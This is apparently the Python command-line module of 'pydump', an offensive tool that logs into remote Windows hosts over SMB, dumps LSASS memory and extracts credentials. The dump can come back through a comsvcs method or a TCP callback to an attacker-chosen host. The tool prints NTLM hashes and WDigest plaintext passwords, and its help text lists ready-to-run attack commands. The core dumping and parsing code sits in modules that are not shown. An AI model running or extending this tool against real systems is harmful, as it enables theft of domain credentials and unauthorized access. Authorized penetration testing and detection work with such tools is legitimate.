"""Command-line interface for pydump."""

import argparse
import sys
import os

from .smb import SmbSession
from .dump.methods import ComSvcsDump, SilentDump
from .parser.minidump import parse
from .parser.extract import CredentialExtractor


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote LSASS dump and credential extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Dump LSASS and extract credentials in one shot
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -d CORP

  # Dump using the silent (TCP callback) method
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m silent --lhost 192.168.1.10

  # Just dump (save .dmp locally without parsing)
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp --no-parse

  # Parse an existing dump file
  pydump parse -f lsass.dmp
""",
    )

    subparsers = parser.add_subparsers(dest="command")

    # ─── dump command ───────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser("dump", help="Dump LSASS from a remote target")
    dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    dump_parser.add_argument("-u", "--username", required=True, help="Username for authentication")
    dump_parser.add_argument("-p", "--password", required=True, help="Password")
    dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
    dump_parser.add_argument(
        "-m", "--method",
        choices=["comsvcs", "silent"],
        default="comsvcs",
        help="Dump method (default: comsvcs)",
    )
    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
    dump_parser.add_argument("--lhost", default=None, help="Local IP for callback (silent method)")
    dump_parser.add_argument("--lport", type=int, default=0, help="Local port for callback (0=auto)")
    dump_parser.add_argument("-o", "--output", default=None, help="Save raw dump to file")
    dump_parser.add_argument("--no-parse", action="store_true", help="Don't parse credentials, just dump")

    # ─── parse command ──────────────────────────────────────────────────────
    parse_parser = subparsers.add_parser("parse", help="Parse an existing minidump file")
    parse_parser.add_argument("-f", "--file", required=True, help="Path to .dmp file")

    args = parser.parse_args()

    if args.command == "dump":
        cmd_dump(args)
    elif args.command == "parse":
        cmd_parse(args)
    else:
        parser.print_help()
        sys.exit(1)


def cmd_dump(args):
    """Execute remote dump and optionally parse credentials."""
    print(f"[*] Connecting to {args.target}...")

    with SmbSession(args.target, args.username, args.password, args.domain) as session:
        print(f"[+] Authenticated as {args.domain}\\{args.username}")

        # Select dump method
        if args.method == "comsvcs":
            method = ComSvcsDump(session)
        elif args.method == "silent":
            if not args.lhost:
                print("[!] --lhost is required for silent method")
                sys.exit(1)
            method = SilentDump(session)
        else:
            print(f"[!] Unknown method: {args.method}")
            sys.exit(1)

        print(f"[*] Dumping LSASS using method: {args.method}")

        if args.method == "silent":
            dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
        else:
            dump_data = method.execute(lsass_pid=args.pid)

        print(f"[+] Received {len(dump_data)} bytes")

        # Save to file if requested
        if args.output:
            with open(args.output, "wb") as f:
                f.write(dump_data)
            print(f"[+] Saved to {args.output}")

        # Parse credentials
        if not args.no_parse:
            _parse_and_display(dump_data)


def cmd_parse(args):
    """Parse a local dump file."""
    if not os.path.isfile(args.file):
        print(f"[!] File not found: {args.file}")
        sys.exit(1)

    with open(args.file, "rb") as f:
        dump_data = f.read()

    print(f"[*] Parsing {args.file} ({len(dump_data)} bytes)")
    _parse_and_display(dump_data)


def _parse_and_display(dump_data: bytes):
    """Parse dump and display extracted credentials."""
    print("[*] Parsing minidump...")
    dump = parse(dump_data)

    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")
    print(f"    Modules: {len(dump.modules)}")
    print(f"    Memory segments: {len(dump.memory)}")
    print()

    print("[*] Extracting credentials...")
    extractor = CredentialExtractor(dump)

    try:
        credentials = extractor.extract()
    except RuntimeError as e:
        print(f"[!] {e}")
        sys.exit(1)

    if not credentials:
        print("[-] No credentials found")
        return

    print(f"[+] Found {len(credentials)} credential(s):\n")
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)

    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash if cred.ntlm_hash else "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password if cred.password else "(empty)"
        else:
            secret = "(see above)"

        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")
